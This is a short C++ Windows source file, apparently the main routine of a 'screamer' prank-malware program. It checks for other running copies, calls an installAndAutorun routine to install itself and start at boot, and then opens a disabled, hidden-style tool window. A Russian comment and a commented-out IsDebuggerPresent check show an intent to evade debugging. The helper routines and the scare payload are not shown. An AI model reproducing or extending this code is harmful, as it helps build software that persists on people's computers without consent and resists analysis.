#include <Windows.h>

#include "functions.h"
#include "checkAnother.h"
#include "installAndAutorun.h"
#include "registerClasses.h"
#include "screamer_class_name.h"
#include "screamer_window_name.h"
#ifdef NDEBUG
int WINAPI wWinMain() {
	HINSTANCE hInstance = GetModuleHandleW(NULL);
#else
int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pCmdLine, _In_ int nCmdShow) {
#endif
	//if (!(IsDebuggerPresent()) && checkAnother() && installAndAutorun() && registerClasses(hInstance) && SUCCEEDED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))) {
	if (checkAnother() && SUCCEEDED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE)) && installAndAutorun() && registerClasses(hInstance)) {
		// Не даём себя отлаживать, проверяем другие экземпляры, устанавливаемся и регистрируем классы
		HWND screamer_window;
		screamer_window = CreateWindowExW(WS_EX_OVERLAPPEDWINDOW | WS_EX_TOOLWINDOW, screamer_class_name, screamer_window_name, WS_POPUP | WS_BORDER | WS_DISABLED, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, NULL, NULL, hInstance, NULL);
		if (screamer_window) {
			MSG message;
			while (GetMessageW(&message, NULL, 0, 0) > 0) {
				TranslateMessage(&message);
				DispatchMessageW(&message);
			};
		};
		CoUninitialize();
	};
	return 0;
};